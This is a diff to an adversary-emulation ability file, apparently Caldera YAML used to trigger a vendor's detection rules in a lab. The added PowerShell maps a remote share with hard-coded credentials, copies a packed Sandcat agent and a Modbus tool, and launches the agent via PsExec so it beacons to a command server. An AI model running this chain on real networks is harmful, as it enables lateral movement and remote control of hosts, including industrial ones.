@@ -1,6 +1,6 @@
-- id: tx1_cpsdr_psexec_cmd
-  name: TX1 CPSDR PsExec Cmd.exe
-  description: Execute cmd.exe via PsExec using PowerShell.
+- id: tx1_cpsdr_tool_transfer
+  name: TX1 CPSDR Tool Transfer
+  description: Trigger CPSDR Rules with lateral movement
   tactic: lateral-movement
   technique:
     attack_id: T1021
@@ -9,6 +9,11 @@
     windows:
       psh:
         command: |
-          Start-Process -FilePath "C:\Users\Public\psexec.exe" -ArgumentList '\\172.18.24.12', '-u', 'txone', '-p', 'tx1otdemo', 'cmd.exe' -NoNewWindow
+          net use \\192.168.95.25 /user:txone 12345678;
+          Copy-Item -Path "C:\Users\Public\sandcat-upx.exe" -Destination "\\192.168.95.25\Users\Public\" -Force;
+          Copy-Item -Path "C:\Users\Public\modbus_cli.exe" -Destination "\\192.168.95.25\Users\Public\" -Force;
+          Start-Process -FilePath "C:\Users\Public\psexec.exe" -ArgumentList '\\192.168.95.25', '-u', 'txone', '-p', '12345678', 'cmd', '/c', 'start "" "C:\Users\Public\sandcat-upx.exe" -server http://172.18.25.10:8888 -group tx2' -NoNewWindow;
         payloads:
+          - sandcat-upx.exe
+          - modbus_cli.exe
           - psexec.exe
